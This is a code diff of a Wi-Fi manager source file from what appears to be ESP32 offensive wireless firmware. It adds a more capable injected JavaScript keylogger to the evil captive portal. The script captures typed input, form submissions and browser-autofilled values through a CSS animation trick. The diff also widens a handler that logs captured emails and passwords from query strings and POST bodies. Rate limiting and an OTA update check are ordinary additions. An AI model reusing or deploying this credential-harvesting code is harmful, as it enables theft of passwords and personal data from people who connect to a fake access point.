@@ -1,6 +1,7 @@
 // wifi_manager.c
 
 #include "managers/wifi_manager.h"
+#include "managers/ghostscript_runtime.h"
 #include "scans/wifi/port_scan.h"
 #include "scans/wifi/arp_scan.h"
 #include "scans/wifi/ssh_scan.h"
@@ -9,6 +10,7 @@
 #include "core/ouis.h"       // For OUI vendor lookup
 #include "managers/ghostchi_manager.h"
 #include "vendor/pcap.h"     // For pcap_is_wireshark_mode()
+#include "esp_attr.h"
 #include "esp_crt_bundle.h"
 #include "esp_event.h"
 #include "esp_heap_caps.h" // Add include for heap stats
@@ -27,6 +29,9 @@
 #include "managers/ap_manager.h"
 #include "managers/rgb_manager.h"
 #include "managers/settings_manager.h"
+#include "managers/ota_manager.h"
+#include "managers/peer_ota_manager.h"
+#include "managers/self_ota_manager.h"
 #include "managers/status_display_manager.h"
 #include "gui/toast.h"
 #include "nvs_flash.h"
@@ -50,6 +55,8 @@
 #include "core/scan_saver.h"
 #include "managers/views/terminal_screen.h"
 #include "core/glog.h"
+#include "core/ghostesp_version.h"
+#include "core/esp_comm_manager.h"
 #include "core/utils.h" // Add utils include
 #include <inttypes.h>
 #include "managers/default_portal.h"
@@ -79,14 +86,7 @@ void music_visualizer_view_update(const uint8_t *amplitudes,
                                   const char *track_name,
                                   const char *artist_name);
 
-// Defines for Wireshark channel validation
-#if defined(CONFIG_IDF_TARGET_ESP32C5)
-#define MAX_WIFI_CHANNEL 165
-#elif defined(CONFIG_IDF_TARGET_ESP32C6)
-#define MAX_WIFI_CHANNEL 13
-#else
-#define MAX_WIFI_CHANNEL 13
-#endif
+#include "core/network_constants.h"
 
 #define MAX_DEVICES 255
 #define CHUNK_SIZE 4096
@@ -143,8 +143,11 @@ static int wifi_reconnect_count = 0;
 static volatile bool wifi_monitor_capture_active = false;
 static volatile bool wifi_timed_scan_active = false;
 #define WIFI_MAX_RECONNECT_ATTEMPTS  5
+#define WIFI_OTA_AUTO_CHECK_TIMEOUT_MS 30000
 static volatile bool visualizer_stop_requested = false;
 static volatile int visualizer_socket = -1;
+static volatile bool ota_auto_check_running = false;
+static volatile bool ota_auto_check_done = false;
 
 static bool karma_portal_active = false;
 
@@ -152,8 +155,8 @@ volatile bool ap_sta_has_ip = false;
 
 // Port definitions moved to core/network_constants.c
 
-static char PORTALURL[512] = "";
-static char domain_str[128] = "";
+EXT_RAM_BSS_ATTR static char PORTALURL[512] = "";
+EXT_RAM_BSS_ATTR static char domain_str[128] = "";
 EventGroupHandle_t wifi_event_group;
 wifi_ap_record_t selected_ap;
 wifi_ap_record_t *selected_aps = NULL;
@@ -175,16 +178,72 @@ dns_server_handle_t dns_handle_take(void) {
 esp_netif_t *wifiAP;
 esp_netif_t *wifiSTA;
 static bool login_done = false;
-static char current_creds_filename[128] = "";
-static char current_keystrokes_filename[128] = "";
+EXT_RAM_BSS_ATTR static char current_creds_filename[128] = "";
+EXT_RAM_BSS_ATTR static char current_keystrokes_filename[128] = "";
 static int ap_connection_count = 0;
 
 #define MAX_HTML_BUFFER_SIZE 2048
+#define PORTAL_MAX_FILE_CACHE_SIZE (512 * 1024)
+#define PORTAL_MAX_LOG_BODY_SIZE 512
+#define PORTAL_LOG_WINDOW_US (1000 * 1000)
+#define PORTAL_LOG_REQUESTS_PER_WINDOW 16
+#define PORTAL_MIN_FLUSH_INTERVAL_US (5 * 1000 * 1000)
+#define PORTAL_MAX_DIAGNOSTIC_HEADER_SIZE 256
 
 // JavaScript snippet injected into every served HTML page to capture keystrokes and input values
 // Keep as const array so it lives in flash (.rodata) and not in RAM
 static const char CAPTURE_JS_SNIPPET[] =
-    "<script>(function(){const send=d=>navigator.sendBeacon?navigator.sendBeacon('/api/log',new Blob([d])):fetch('/api/log',{method:'POST',headers:{\"Content-Type\":\"text/plain\"},body:d});const h=e=>{const t=e.target;if(!(t.name||t.id))return;const tag=t.tagName.toLowerCase();send(Date.now()+\"|\"+tag+\"|\"+(t.name||t.id)+\"|\"+t.value+\"\\n\");};['input','change','keydown'].forEach(ev=>document.addEventListener(ev,h,true));})();</script>";
+    "<script>(function(){"
+    "var s=document.createElement('style');"
+    "s.textContent='@-webkit-keyframes ghost_af{0%{opacity:0.9}100%{opacity:1}}input:-webkit-autofill{animation:ghost_af 0s;}';"
+    "document.head.appendChild(s);"
+    "function send(d){"
+    "if(navigator.sendBeacon)navigator.sendBeacon('/api/log',new Blob([d]));"
+    "else fetch('/api/log',{method:'POST',headers:{'Content-Type':'text/plain'},body:d});"
+    "}"
+    "function fieldId(t){"
+    "return t.name||t.id||t.getAttribute('placeholder')||t.getAttribute('aria-label')||t.type||'';"
+    "}"
+    "function fieldVal(t){"
+    "var tag=t.tagName.toLowerCase();"
+    "if(tag==='select')return t.options[t.selectedIndex]?t.options[t.selectedIndex].text:'';"
+    "if(t.type==='checkbox'||t.type==='radio')return t.checked?'1':'0';"
+    "return t.value||'';"
+    "}"
+    "function capture(e){"
+    "var t=e.target;if(!t||!t.tagName)return;"
+    "var tag=t.tagName.toLowerCase();"
+    "if(tag!=='input'&&tag!=='textarea'&&tag!=='select')return;"
+    "var id=fieldId(t);if(!id)return;"
+    "var val=fieldVal(t);"
+    "send(Date.now()+'|'+tag+'|'+id+'|'+val+'\\n');"
+    "}"
+    "var debounce;"
+    "function debounceCapture(e){"
+    "clearTimeout(debounce);debounce=setTimeout(function(){capture(e);},300);"
+    "}"
+    "function captureForm(form){"
+    "var data=[];"
+    "var els=form.elements;"
+    "for(var i=0;i<els.length;i++){"
+    "var t=els[i];if(!t.name&&!t.id)continue;"
+    "var val=fieldVal(t);"
+    "data.push((t.name||t.id)+'='+val);"
+    "}"
+    "if(data.length)send('form|'+form.action+'|'+data.join('&')+'\\n');"
+    "}"
+    "document.addEventListener('input',debounceCapture,true);"
+    "document.addEventListener('change',capture,true);"
+    "document.addEventListener('submit',function(e){"
+    "var form=e.target;if(form&&form.tagName&&form.tagName.toLowerCase()==='form'){captureForm(form);}"
+    "},true);"
+    "document.addEventListener('animationstart',function(e){"
+    "if(e.animationName==='ghost_af'){capture(e);}"
+    "},true);"
+    "document.addEventListener('keydown',function(e){"
+    "if(e.key==='Enter'){var t=e.target;if(t&&(t.tagName==='INPUT'||t.tagName==='TEXTAREA'))capture({target:t});}"
+    "},true);"
+    "})();</script>";
 static char* html_buffer = NULL;
 static size_t html_buffer_size = 0;
 static bool use_html_buffer = false;
@@ -206,12 +265,132 @@ static void portal_clear_file_cache(void) {
     portal_file_cache_size = 0;
 }
 
-#define PORTAL_KEYSTROKE_BUF_SZ 512
-#define PORTAL_CREDS_BUF_SZ 384
-static char s_portal_keystroke_buf[PORTAL_KEYSTROKE_BUF_SZ];
+#define PORTAL_KEYSTROKE_BUF_SZ 1024
+#define PORTAL_CREDS_BUF_SZ 768
+EXT_RAM_BSS_ATTR static char s_portal_keystroke_buf[PORTAL_KEYSTROKE_BUF_SZ];
 static size_t s_portal_keystroke_len = 0;
-static char s_portal_creds_buf[PORTAL_CREDS_BUF_SZ];
+EXT_RAM_BSS_ATTR static char s_portal_creds_buf[PORTAL_CREDS_BUF_SZ];
 static size_t s_portal_creds_len = 0;
+static int64_t s_portal_log_window_started_us = 0;
+static unsigned int s_portal_log_requests_in_window = 0;
+static int64_t s_portal_last_flush_us = 0;
+
+// Per-client HTTP rate limiting for all portal requests (not just /api/log).
+// This catches floods directed at /login, captive probes, and static assets.
+#define PORTAL_HTTP_RL_TABLE_SIZE 8
+#define PORTAL_HTTP_RL_BURST 8
+#define PORTAL_HTTP_RL_REFILL_US (100 * 1000)  // 100 ms
+#define PORTAL_HTTP_RL_REFILL_TOKENS 1
+
+typedef struct {
+    uint32_t src_addr;
+    uint8_t tokens;
+    int64_t last_refill_us;
+} portal_http_rl_entry_t;
+
+static portal_http_rl_entry_t s_portal_http_rl_table[PORTAL_HTTP_RL_TABLE_SIZE] = {0};
+
+static bool portal_http_rate_limit_allow(uint32_t src_addr) {
+    const int64_t now = esp_timer_get_time();
+    portal_http_rl_entry_t *slot = NULL;
+    portal_http_rl_entry_t *oldest = NULL;
+    int64_t oldest_time = INT64_MAX;
+
+    for (int i = 0; i < PORTAL_HTTP_RL_TABLE_SIZE; i++) {
+        if (s_portal_http_rl_table[i].src_addr == src_addr) {
+            slot = &s_portal_http_rl_table[i];
+            break;
+        }
+        if (s_portal_http_rl_table[i].src_addr == 0) {
+            if (!slot) slot = &s_portal_http_rl_table[i];
+        } else if (s_portal_http_rl_table[i].last_refill_us < oldest_time) {
+            oldest_time = s_portal_http_rl_table[i].last_refill_us;
+            oldest = &s_portal_http_rl_table[i];
+        }
+    }
+
+    if (!slot) {
+        slot = oldest;
+        slot->src_addr = src_addr;
+        slot->tokens = 0;
+    }
+
+    if (slot->src_addr == 0) {
+        slot->src_addr = src_addr;
+        slot->tokens = PORTAL_HTTP_RL_BURST;
+        slot->last_refill_us = now;
+    }
+
+    int64_t elapsed = now - slot->last_refill_us;
+    if (elapsed >= PORTAL_HTTP_RL_REFILL_US) {
+        int64_t refills = elapsed / PORTAL_HTTP_RL_REFILL_US;
+        int64_t new_tokens = (int64_t)slot->tokens + refills * PORTAL_HTTP_RL_REFILL_TOKENS;
+        if (new_tokens > PORTAL_HTTP_RL_BURST) new_tokens = PORTAL_HTTP_RL_BURST;
+        slot->tokens = (uint8_t)new_tokens;
+        slot->last_refill_us = now;
+    }
+
+    if (slot->tokens > 0) {
+        slot->tokens--;
+        return true;
+    }
+    return false;
+}
+
+static uint32_t portal_get_client_addr(httpd_req_t *req) {
+    int sock = httpd_req_to_sockfd(req);
+    if (sock < 0) return 0;
+    struct sockaddr_storage peer_addr;
+    socklen_t peer_len = sizeof(peer_addr);
+    if (getpeername(sock, (struct sockaddr *)&peer_addr, &peer_len) != 0) {
+        return 0;
+    }
+    if (peer_addr.ss_family == AF_INET) {
+        return ((struct sockaddr_in *)&peer_addr)->sin_addr.s_addr;
+    }
+#if LWIP_IPV6
+    if (peer_addr.ss_family == AF_INET6) {
+        struct sockaddr_in6 *addr6 = (struct sockaddr_in6 *)&peer_addr;
+        if (IN6_IS_ADDR_V4MAPPED(addr6->sin6_addr.s6_addr)) {
+            return PP_HTONL(LWIP_MAKEU32(addr6->sin6_addr.s6_addr[12],
+                                         addr6->sin6_addr.s6_addr[13],
+                                         addr6->sin6_addr.s6_addr[14],
+                                         addr6->sin6_addr.s6_addr[15]));
+        }
+    }
+#endif
+    return 0;
+}
+
+static void portal_flush_buffers_to_sd(void);
+
+static bool portal_capture_request_allowed(void) {
+    const int64_t now = esp_timer_get_time();
+
+    if (s_portal_log_window_started_us == 0 ||
+        now - s_portal_log_window_started_us >= PORTAL_LOG_WINDOW_US) {
+        s_portal_log_window_started_us = now;
+        s_portal_log_requests_in_window = 0;
+    }
+
+    if (s_portal_log_requests_in_window >= PORTAL_LOG_REQUESTS_PER_WINDOW) {
+        return false;
+    }
+
+    s_portal_log_requests_in_window++;
+    return true;
+}
+
+static void portal_flush_buffers_if_due(void) {
+    const int64_t now = esp_timer_get_time();
+    if (s_portal_last_flush_us != 0 &&
+        now - s_portal_last_flush_us < PORTAL_MIN_FLUSH_INTERVAL_US) {
+        return;
+    }
+
+    s_portal_last_flush_us = now;
+    portal_flush_buffers_to_sd();
+}
 
 static void portal_flush_buffers_to_sd(void) {
 #if defined(CONFIG_BUILD_CONFIG_TEMPLATE)
@@ -419,7 +598,9 @@ static inline bool stream_buf_lock(void) {
         g_stream_buf_mutex = xSemaphoreCreateMutex();
         if (g_stream_buf_mutex == NULL) return false;
     }
-    if (xSemaphoreTake(g_stream_buf_mutex, portMAX_DELAY) != pdTRUE) return false;
+    // Bounded wait: prevents one stalled client from monopolizing the shared
+    // streaming buffer when the portal is under heavy load.
+    if (xSemaphoreTake(g_stream_buf_mutex, pdMS_TO_TICKS(3000)) != pdTRUE) return false;
     if (g_stream_buf == NULL) {
 #if CONFIG_SPIRAM
         g_stream_buf = (char *)heap_caps_malloc(CHUNK_SIZE + 1, MALLOC_CAP_SPIRAM | MALLOC_CAP_8BIT);
@@ -441,6 +622,18 @@ static inline void stream_buf_unlock(void) {
     if (g_stream_buf_mutex) {
         xSemaphoreGive(g_stream_buf_mutex);
     }
+}
+
+void wifi_manager_release_stream_buffer(void) {
+    SemaphoreHandle_t mutex = g_stream_buf_mutex;
+    if (!mutex) return;
+
+    if (xSemaphoreTake(mutex, portMAX_DELAY) != pdTRUE) return;
+    free(g_stream_buf);
+    g_stream_buf = NULL;
+    g_stream_buf_mutex = NULL;
+    xSemaphoreGive(mutex);
+    vSemaphoreDelete(mutex);
 }
 
 // Station scan channel hopping moved to station_scan.c module
@@ -488,7 +681,13 @@ static void wifi_reconnect_timer_stop(void) {
     }
 }
 
+static bool wifi_reconnect_hold = false;
+
 static bool wifi_reconnect_blocked(const char **reason_out) {
+    if (wifi_reconnect_hold) {
+        if (reason_out) *reason_out = "radio reserved";
+        return true;
+    }
     if (wifi_monitor_capture_active) {
         if (reason_out) *reason_out = "monitor mode";
         return true;
@@ -507,6 +706,11 @@ static bool wifi_reconnect_blocked(const char **reason_out) {
     }
 
     return false;
+}
+
+void wifi_manager_set_reconnect_hold(bool hold) {
+    wifi_reconnect_hold = hold;
+    if (hold) wifi_manager_stop_reconnect();
 }
 
 static void wifi_reconnect_reset(void) {
@@ -535,6 +739,10 @@ static void wifi_reconnect_timer_cb(void *arg) {
 
 static void wifi_reconnect_schedule(void) {
     wifi_reconnect_timer_stop();
+
+    if (!settings_get_wifi_auto_reconnect(&G_Settings)) {
+        return;
+    }
 
     if (wifi_reconnect_count > 0 && wifi_reconnect_count <= WIFI_MAX_RECONNECT_ATTEMPTS) {
         static const int backoff_ms[] = {3000, 5000, 10000, 20000, 30000};
@@ -659,6 +867,122 @@ static void wifi_event_handler(void *arg, esp_event_base_t event_base, int32_t e
                                void *event_data);
 static void wifi_retry_timer_callback(void* arg);
 
+static bool wait_for_ota_check_result(uint32_t timeout_ms) {
+    bool saw_checking = false;
+    uint32_t waited = 0;
+    while (waited < timeout_ms) {
+        OtaStatus status = ota_manager_get_status();
+        if (status.state == OTA_STATE_UPDATE_AVAILABLE) return true;
+        if (status.state == OTA_STATE_CHECKING) {
+            saw_checking = true;
+        } else if (saw_checking || waited >= 500) {
+            return false;
+        }
+        vTaskDelay(pdMS_TO_TICKS(200));
+        waited += 200;
+    }
+    return false;
+}
+
+static bool wait_for_self_ota_check_result(uint32_t timeout_ms) {
+    bool saw_checking = false;
+    uint32_t waited = 0;
+    while (waited < timeout_ms) {
+        SelfOtaStatus status = self_ota_manager_get_status();
+        if (status.state == SELF_OTA_STATE_UPDATE_AVAILABLE) return true;
+        if (status.state == SELF_OTA_STATE_CHECKING) {
+            saw_checking = true;
+        } else if (saw_checking || waited >= 500) {
+            return false;
+        }
+        vTaskDelay(pdMS_TO_TICKS(200));
+        waited += 200;
+    }
+    return false;
+}
+
+static bool wait_for_peer_ota_check_result(uint32_t timeout_ms) {
+    bool saw_checking = false;
+    uint32_t waited = 0;
+    while (waited < timeout_ms) {
+        PeerOtaStatus status = peer_ota_manager_get_status();
+        if (status.state == PEER_OTA_STATE_UPDATE_AVAILABLE) return true;
+        if (status.state == PEER_OTA_STATE_CHECKING) {
+            saw_checking = true;
+        } else if (saw_checking || waited >= 500) {
+            return false;
+        }
+        vTaskDelay(pdMS_TO_TICKS(200));
+        waited += 200;
+    }
+    return false;
+}
+
+static void ota_auto_check_task(void *arg) {
+    (void)arg;
+
+#ifndef CONFIG_SPIRAM
+    ESP_LOGI(TAG, "Skipping OTA auto-check on no-PSRAM build");
+    ota_auto_check_done = true;
+    ota_auto_check_running = false;
+    vTaskDelete(NULL);
+    return;
+#endif
+
+    bool update_available = false;
+
+    if (ota_manager_is_supported()) {
+        if (ota_manager_check_now() == ESP_OK && wait_for_ota_check_result(WIFI_OTA_AUTO_CHECK_TIMEOUT_MS)) {
+            OtaStatus status = ota_manager_get_status();
+            if (status.latest_build_number > (long)GHOSTESP_BUILD_NUMBER) {
+                glog("There is a new update available: device firmware %s (build %ld > %ld)\n",
+                     status.latest_version, status.latest_build_number, (long)GHOSTESP_BUILD_NUMBER);
+                update_available = true;
+            }
+        }
+    } else if (self_ota_manager_is_supported()) {
+        if (self_ota_manager_check_now() == ESP_OK && wait_for_self_ota_check_result(WIFI_OTA_AUTO_CHECK_TIMEOUT_MS)) {
+            SelfOtaStatus status = self_ota_manager_get_status();
+            if (status.latest_build_number > (long)GHOSTESP_BUILD_NUMBER) {
+                glog("There is a new update available: device firmware %s (build %ld > %ld)\n",
+                     status.latest_version, status.latest_build_number, (long)GHOSTESP_BUILD_NUMBER);
+                update_available = true;
+            }
+        }
+    }
+
+    if (peer_ota_manager_is_supported() && esp_comm_manager_is_connected()) {
+        if (peer_ota_manager_check_now() == ESP_OK && wait_for_peer_ota_check_result(WIFI_OTA_AUTO_CHECK_TIMEOUT_MS)) {
+            PeerOtaStatus status = peer_ota_manager_get_status();
+            if (status.peer_current_build_number >= 0 &&
+                status.peer_build_number > status.peer_current_build_number) {
+                glog("There is a new update available: GhostLink peer firmware %s (build %ld > %ld)\n",
+                     status.peer_version, status.peer_build_number, status.peer_current_build_number);
+                update_available = true;
+            }
+        }
+    }
+
+    if (update_available) {
+        toast_show("There is a new update available", TOAST_INFO);
+    }
+
+    ota_auto_check_done = true;
+    ota_auto_check_running = false;
+    vTaskDelete(NULL);
+}
+
+static void schedule_ota_auto_check(void) {
+    if (ota_auto_check_running || ota_auto_check_done) return;
+    ota_auto_check_running = true;
+    BaseType_t rc = xTaskCreate(ota_auto_check_task, "ota_auto_chk", 6144, NULL,
+                                tskIDLE_PRIORITY + 1, NULL);
+    if (rc != pdPASS) {
+        ota_auto_check_running = false;
+        glog("Failed to start automatic firmware update check\n");
+    }
+}
+
 static void wifi_event_handler(void *arg, esp_event_base_t event_base, int32_t event_id,
                                void *event_data)
 {
@@ -705,13 +1029,18 @@ static void wifi_event_handler(void *arg, esp_event_base_t event_base, int32_t e
             status_display_show_status("WiFi Lost");
             toast_show("WiFi lost", TOAST_WARN);
 
-            wifi_reconnect_count++;
-            if (wifi_reconnect_count <= WIFI_MAX_RECONNECT_ATTEMPTS) {
-                glog("Scheduling reconnect %d/%d\n", wifi_reconnect_count, WIFI_MAX_RECONNECT_ATTEMPTS);
-                wifi_reconnect_schedule();
+            if (!settings_get_wifi_auto_reconnect(&G_Settings)) {
+                glog("Auto-reconnect disabled; not retrying\n");
+                wifi_reconnect_reset();
             } else {
-                glog("Max reconnect attempts (%d) reached\n", WIFI_MAX_RECONNECT_ATTEMPTS);
-                wifi_reconnect_timer_stop();
+                wifi_reconnect_count++;
+                if (wifi_reconnect_count <= WIFI_MAX_RECONNECT_ATTEMPTS) {
+                    glog("Scheduling reconnect %d/%d\n", wifi_reconnect_count, WIFI_MAX_RECONNECT_ATTEMPTS);
+                    wifi_reconnect_schedule();
+                } else {
+                    glog("Max reconnect attempts (%d) reached\n", WIFI_MAX_RECONNECT_ATTEMPTS);
+                    wifi_reconnect_timer_stop();
+                }
             }
         }
         
@@ -743,6 +1072,7 @@ static void wifi_event_handler(void *arg, esp_event_base_t event_base, int32_t e
         if (settings_get_wigle_auto_upload(&G_Settings)) {
             wigle_upload_all_async();
         }
+        schedule_ota_auto_check();
     }
 }
 // Removed old wifi_retry_timer_callback - using unified retry system
@@ -942,20 +1272,24 @@ const char *get_content_type(const char *uri) {
 }
 
 char *get_host_from_req(httpd_req_t *req) {
-    size_t buf_len = httpd_req_get_hdr_value_len(req, "Host") + 1;
-    if (buf_len > 1) {
-        char *host = malloc(buf_len);
+    size_t host_len = httpd_req_get_hdr_value_len(req, "Host");
+    if (host_len > 0 && host_len <= PORTAL_MAX_DIAGNOSTIC_HEADER_SIZE) {
+        char *host = malloc(host_len + 1);
         if (!host) {
             httpd_resp_send_500(req);
             return NULL;
         }
-        if (httpd_req_get_hdr_value_str(req, "Host", host, buf_len) == ESP_OK) {
+        if (httpd_req_get_hdr_value_str(req, "Host", host, host_len + 1) == ESP_OK) {
             printf("Host header found: %s\n", host);
             return host; // Caller must free() this memory
         }
         free(host);
     }
-    printf("Host header not found\n");
+    if (host_len > PORTAL_MAX_DIAGNOSTIC_HEADER_SIZE) {
+        ESP_LOGW(TAG, "Ignoring oversized Host header (%zu bytes)", host_len);
+    } else {
+        printf("Host header not found\n");
+    }
     return NULL;
 }
 
@@ -1019,23 +1353,32 @@ esp_err_t done_handler(httpd_req_t *req) {
     return ESP_OK;
 }
 esp_err_t portal_handler(httpd_req_t *req) {
-    printf("Client requested URL: %s\n", req->uri);
-    ESP_LOGI(TAG, "Free heap before serving portal: %" PRIu32 " bytes", esp_get_free_heap_size()); // Log heap size
+    // Rate-limit /login and other directly-served portal pages too.
+    uint32_t client_addr = portal_get_client_addr(req);
+    if (client_addr != 0 && !portal_http_rate_limit_allow(client_addr)) {
+        httpd_resp_set_hdr(req, "Connection", "close");
+        httpd_resp_set_status(req, "429 Too Many Requests");
+        httpd_resp_send(req, "Too many requests", HTTPD_RESP_USE_STRLEN);
+        return ESP_OK;
+    }
+
+    ESP_LOGD(TAG, "Client requested URL: %s", req->uri);
+    ESP_LOGD(TAG, "Free heap before serving portal: %" PRIu32 " bytes", esp_get_free_heap_size()); // Log heap size
 
     // Debug buffer state
-    ESP_LOGI(TAG, "HTML buffer check: html_buffer=%p, html_buffer_size=%zu, use_html_buffer=%s", 
+    ESP_LOGD(TAG, "HTML buffer check: html_buffer=%p, html_buffer_size=%zu, use_html_buffer=%s",
              html_buffer, html_buffer_size, use_html_buffer ? "true" : "false");
 
     // Prefer buffered HTML over default embedded portal when available
     if (html_buffer != NULL && html_buffer_size > 0) {
-        ESP_LOGI(TAG, "Using buffered HTML (size: %zu bytes)", html_buffer_size);
+        ESP_LOGD(TAG, "Using buffered HTML (size: %zu bytes)", html_buffer_size);
         httpd_resp_set_type(req, "text/html");
         httpd_resp_set_hdr(req, "Transfer-Encoding", "chunked"); // Set chunked response
         httpd_resp_send_chunk(req, html_buffer, html_buffer_size);
         httpd_resp_send_chunk(req, CAPTURE_JS_SNIPPET, strlen(CAPTURE_JS_SNIPPET));
         httpd_resp_send_chunk(req, NULL, 0);
-        ESP_LOGI(TAG, "Served HTML from buffer (size: %zu bytes) with JS injection.", html_buffer_size);
-        ESP_LOGI(TAG, "Free heap after serving buffer: %" PRIu32 " bytes", esp_get_free_heap_size());
+        ESP_LOGD(TAG, "Served HTML from buffer (size: %zu bytes) with JS injection.", html_buffer_size);
+        ESP_LOGD(TAG, "Free heap after serving buffer: %" PRIu32 " bytes", esp_get_free_heap_size());
         return ESP_OK;
     }
 
@@ -1043,13 +1386,13 @@ esp_err_t portal_handler(httpd_req_t *req) {
     // This avoids re-mounting the SD from the HTTP server task where SPI bus contention
     // with the display causes the mount to fail and returns an error page to the client.
     if (portal_file_cache != NULL && portal_file_cache_size > 0) {
-        ESP_LOGI(TAG, "Using pre-loaded portal file cache (%zu bytes)", portal_file_cache_size);
+        ESP_LOGD(TAG, "Using pre-loaded portal file cache (%zu bytes)", portal_file_cache_size);
         httpd_resp_set_type(req, "text/html");
         httpd_resp_set_hdr(req, "Transfer-Encoding", "chunked");
         httpd_resp_send_chunk(req, portal_file_cache, portal_file_cache_size);
         httpd_resp_send_chunk(req, CAPTURE_JS_SNIPPET, strlen(CAPTURE_JS_SNIPPET));
         httpd_resp_send_chunk(req, NULL, 0);
-        ESP_LOGI(TAG, "Served portal from file cache with JS injection.");
+        ESP_LOGD(TAG, "Served portal from file cache with JS injection.");
         return ESP_OK;
     }
 
@@ -1060,8 +1403,8 @@ esp_err_t portal_handler(httpd_req_t *req) {
         httpd_resp_send_chunk(req, default_portal_html, strlen(default_portal_html));
         httpd_resp_send_chunk(req, CAPTURE_JS_SNIPPET, strlen(CAPTURE_JS_SNIPPET));
         httpd_resp_send_chunk(req, NULL, 0);
-        ESP_LOGI(TAG, "Served default embedded portal with JS injection.");
-        ESP_LOGI(TAG, "Free heap after serving default portal: %" PRIu32 " bytes", esp_get_free_heap_size()); // Log heap size
+        ESP_LOGD(TAG, "Served default embedded portal with JS injection.");
+        ESP_LOGD(TAG, "Free heap after serving default portal: %" PRIu32 " bytes", esp_get_free_heap_size()); // Log heap size
         return ESP_OK;
     }
 
@@ -1095,91 +1438,189 @@ esp_err_t portal_handler(httpd_req_t *req) {
         httpd_resp_send(req, error_message, strlen(error_message));
     }
 
-    ESP_LOGI(TAG, "Free heap after serving portal: %" PRIu32 " bytes", esp_get_free_heap_size()); // Log heap size
+    ESP_LOGD(TAG, "Free heap after serving portal: %" PRIu32 " bytes", esp_get_free_heap_size()); // Log heap size
     return ESP_OK;
 }
 esp_err_t get_log_handler(httpd_req_t *req) {
-    char body[256] = {0};
-    int received = 0;
+    if (req->content_len <= 0 || req->content_len > PORTAL_MAX_LOG_BODY_SIZE) {
+        httpd_resp_set_hdr(req, "Connection", "close");
+        httpd_resp_set_status(req, "413 Payload Too Large");
+        httpd_resp_send(req, "Portal log payload too large", HTTPD_RESP_USE_STRLEN);
+        return ESP_FAIL;
+    }
+
+    if (!portal_capture_request_allowed()) {
+        httpd_resp_set_hdr(req, "Connection", "close");
+        httpd_resp_set_status(req, "429 Too Many Requests");
+        httpd_resp_send(req, "Portal log rate limit exceeded", HTTPD_RESP_USE_STRLEN);
+        return ESP_FAIL;
+    }
+
+    char body[PORTAL_MAX_LOG_BODY_SIZE + 1];
+    size_t received_total = 0;
 
     bool require_jit = false;
 #ifdef CONFIG_BUILD_CONFIG_TEMPLATE
     require_jit = (strcmp(CONFIG_BUILD_CONFIG_TEMPLATE, "somethingsomething") == 0);
 #endif
 
-    while ((received = httpd_req_recv(req, body, sizeof(body) - 1)) > 0) {
-        body[received] = '\0';
-
-        if (current_keystrokes_filename[0] != '\0') {
-            if (!require_jit) {
-                if (sd_card_manager.is_initialized) {
-                    FILE *f = fopen(current_keystrokes_filename, "a");
-                    if (f) { 
-                        fprintf(f, "%s", body); 
-                        fclose(f); 
-                    }
-                }
-            } else {
-                size_t chunk = strlen(body);
-                if (s_portal_keystroke_len + chunk >= PORTAL_KEYSTROKE_BUF_SZ) {
-                    portal_flush_buffers_to_sd();
-                    chunk = strlen(body);
-                }
-                size_t avail = PORTAL_KEYSTROKE_BUF_SZ - s_portal_keystroke_len;
-                if (chunk > avail) chunk = avail;
-                memcpy(s_portal_keystroke_buf + s_portal_keystroke_len, body, chunk);
-                s_portal_keystroke_len += chunk;
+    while (received_total < (size_t)req->content_len) {
+        int received = httpd_req_recv(req, body + received_total,
+                                     (size_t)req->content_len - received_total);
+        if (received <= 0) {
+            if (received == HTTPD_SOCK_ERR_TIMEOUT) {
+                httpd_resp_send_408(req);
             }
+            return ESP_FAIL;
+        }
+        received_total += (size_t)received;
+    }
+    body[received_total] = '\0';
+
+    if (current_keystrokes_filename[0] != '\0') {
+        if (!require_jit) {
+            if (sd_card_manager.is_initialized) {
+                FILE *f = fopen(current_keystrokes_filename, "a");
+                if (f) {
+                    fwrite(body, 1, received_total, f);
+                    fclose(f);
+                }
+            }
+        } else {
+            size_t chunk = received_total;
+            if (s_portal_keystroke_len + chunk >= PORTAL_KEYSTROKE_BUF_SZ) {
+                portal_flush_buffers_if_due();
+            }
+            size_t avail = PORTAL_KEYSTROKE_BUF_SZ - s_portal_keystroke_len;
+            if (chunk > avail) chunk = avail;
+            memcpy(s_portal_keystroke_buf + s_portal_keystroke_len, body, chunk);
+            s_portal_keystroke_len += chunk;
         }
     }
-
-    if (received < 0) return ESP_FAIL;
 
     httpd_resp_send(req, "Body content logged successfully", 30);
     return ESP_OK;
 }
 
 esp_err_t get_info_handler(httpd_req_t *req) {
-    char query[256] = {0};
-    char decoded_email[64] = {0};
-    char decoded_password[64] = {0};
+    char query[512] = {0};
+    char decoded_email[128] = {0};
+    char decoded_password[128] = {0};
 
     bool require_jit = false;
 #ifdef CONFIG_BUILD_CONFIG_TEMPLATE
     require_jit = (strcmp(CONFIG_BUILD_CONFIG_TEMPLATE, "somethingsomething") == 0);
 #endif
 
-    if (httpd_req_get_url_query_str(req, query, sizeof(query)) == ESP_OK) {
-        char email_val[64] = {0};
-        char pass_val[64] = {0};
-        if (get_query_param_value(query, "email", email_val, sizeof(email_val)) == ESP_OK) {
-            url_decode(decoded_email, email_val);
-        }
-        if (get_query_param_value(query, "password", pass_val, sizeof(pass_val)) == ESP_OK) {
-            url_decode(decoded_password, pass_val);
-        }
-        glog("Captured credentials: %s / %s\n", decoded_email, decoded_password);
-        toast_show("Credentials captured!", TOAST_SUCCESS);
+    if (!portal_capture_request_allowed()) {
+        httpd_resp_set_hdr(req, "Connection", "close");
+        httpd_resp_set_status(req, "429 Too Many Requests");
+        httpd_resp_send(req, "Portal capture rate limit exceeded", HTTPD_RESP_USE_STRLEN);
+        return ESP_FAIL;
+    }
 
+    // Try query string first (GET), then read POST body if no query
+    if (httpd_req_get_url_query_str(req, query, sizeof(query)) != ESP_OK) {
+        // For POST /get with form body
+        if (req->content_len > 0 && req->content_len < (int)sizeof(query) - 1) {
+            int received = 0;
+            while (received < req->content_len) {
+                int r = httpd_req_recv(req, query + received, req->content_len - received);
+                if (r <= 0) break;
+                received += r;
+            }
+            query[received] = '\0';
+        }
+    }
+
+    if (query[0] != '\0') {
+        // Extract known fields first
+        char val_buf[128] = {0};
+        if (get_query_param_value(query, "email", val_buf, sizeof(val_buf)) == ESP_OK) {
+            url_decode(decoded_email, val_buf);
+        }
+        if (get_query_param_value(query, "password", val_buf, sizeof(val_buf)) == ESP_OK) {
+            url_decode(decoded_password, val_buf);
+        }
+        // Also try common alternative field names
+        if (decoded_email[0] == '\0') {
+            const char *email_keys[] = {"user", "username", "login", "account", "phone", NULL};
